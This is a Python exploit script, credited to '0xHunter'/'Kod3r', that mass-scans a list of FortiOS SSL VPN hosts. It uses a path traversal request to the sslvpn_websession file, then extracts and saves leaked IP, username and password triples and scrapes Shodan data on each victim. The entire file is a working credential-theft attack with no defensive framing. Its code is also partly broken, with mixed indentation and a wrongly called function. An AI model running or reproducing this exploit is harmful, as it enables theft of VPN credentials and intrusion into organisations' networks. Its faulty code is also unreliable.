import requests, sys, time
import lxml.html as lh
import pandas as pd
import urllib3
import thread
import time
import sys
import os
import subprocess
import re

urllib3.disable_warnings()

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

print(bcolors.HEADER + bcolors.BOLD + "   [>] " + bcolors.OKGREEN + "FortiOS Credentials Disclosure - Auto Exploiter" + bcolors.ENDC)
print(bcolors.HEADER + bcolors.BOLD + "    [>] " + bcolors.OKGREEN + "Exploit Dev : 0xHunter" + bcolors.ENDC + '\r\n')

ips = []
def checkiip(ip):
    p = re.compile(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}[\x00]+[^\x00]+[\x00]+[^\x00]+")
    return p.findall(ip)
def ipaccpas(s):
    pattern = re.compile('[^\x00]+')
    result = pattern.findall(s)
    return result

def leak(host, port):
	try:
		url = host+":"+port+"/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
		headers = {"User-Agent": "Mozilla/5.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}		
		r=requests.get(url, headers=headers, verify=False, stream=True)
		img=str(r.raw.read())
                #if the leak info contains string fgt_lang then output file
		if "fgt_lang" in img:
			with open(host+":"+port+".dat", 'w') as f:
				f.write(img)		
                        with open( "unify.txt",'a') as out_file:
                            tmp = checkiip(img)
                            ip = ''
                            if tmp:
                                for getip in tmp:
                                    ret = ipaccpas(getip)
                                    ip = ret[0]+':'+ret[1]+':'+ret[2]
                                    if ip not in ips:
                                        ips.append(ip)
                                        out_file.write(ip+'\n')
			parse(host,port)
			print("\n")
			return True
		else:
			return False
	except requests.exceptions.ConnectionError:
		return False
def is_character_printable(s):
	return all((ord(c) < 127) and (ord(c) >= 32) for c in s)

def is_printable(byte):
    if is_character_printable(byte):
    		return byte
    else:
            return '.' 

def read_bytes(host, port,chunksize=8192):
	with open(host+":"+port+".dat", "rb") as f:
    		while True:
        		chunk = f.read(chunksize)
        		if chunk:
          			for b in chunk:
            				yield b
        		else:
          			break
def parse(host,port):
    print(bcolors.BOLD + bcolors.OKBLUE + "[>] " + bcolors.OKGREEN + host + ':' + port + ' Is Vulnerable - Exploiting...' + bcolors.ENDC)
    memory_address = 0
    ascii_string = ""
    report = 'VPN : ' + host + ':' + port + '\r\n'
    try:
        url = "https://www.shodan.io/host/"+host
        headers = {"User-Agent": "Mozilla/5.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
        page = requests.get(url, headers=headers)
        doc = lh.fromstring(page.content)
        tr_elements = doc.xpath('//tr')
        info = ''
        for t in tr_elements:
            name=t.text_content().split('\n')
            info += name[1] + ' : ' + name[2] + '\r\n'
        report += info + '\r\n'
    except Exception as e:
        raise e
    for byte in read_bytes(host):
    	ascii_string = ascii_string + is_printable(byte)
    if memory_address%61 == 60:
        if ascii_string!=".............................................................":
            report = report + ascii_string + '\r\n'
                #print(report)
            ascii_string = ""
    memory_address = memory_address + 1
    content = str(report)
    f = open(host+":"+port+'.txt', 'w');
    f.write(content)
    f.close()
    #os.remove("sslvpn_websession_"+host+".dat");

def check(host, port):
    uri = "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
    try:
        r = requests.get("https://" + host + ":" + port + uri, verify=False)
        if(r.status_code == 200):
            return True
        elif(r.status_code == 404):
            return False
        else:
            return False
    except Exception as e:
        print(e)
        return False
def main(host, port):
    vuln = check(host, port)
    if(vuln):
        bin_file = leak(host, port)
        #print(bin_file)
    else:
        print(bcolors.BOLD+bcolors.HEADER+"[-] " + bcolors.OKBLUE+ host + ':'  +port + '\tIs Secure ' + bcolors.ENDC)

if len(sys.argv) != 2:
    print(bcolors.BOLD+bcolors.HEADER+ "    [>] " + bcolors.OKGREEN + 'Usage : python ' + sys.argv[0] + ' List.txt' + bcolors.ENDC) 
    exit()
file = sys.argv[1]
file = open(file, "r")
urls = file.readlines()
integer_c = 1
for url in urls:
    integer_c += 1
    if len(urls) == integer_c:
        print(bcolors.BOLD+bcolors.HEADER+"[*] " + bcolors.OKGREEN+'List Finished...  ' + bcolors.ENDC)
        print(bcolors.BOLD+bcolors.HEADER+"[*] " + bcolors.OKGREEN+'Waiting to compelete job...  ' + bcolors.ENDC)
        print(bcolors.BOLD+bcolors.HEADER+"[*] " + bcolors.OKGREEN+'Code By Kod3r...  ' + bcolors.ENDC)
    url = url.replace('\r','')
    url = url.replace('\n','')
    url = url.replace(' ','')
    url = url.split(':')
    host = url[0]
    if len(url) == 1:
        port = '443'
    else:
        port = url[1]
    time.sleep(0.4)
    thread.start_new_thread( main, (url[0], port, ) )

#while 1:
#    pass
time.sleep(5)
print("OK")
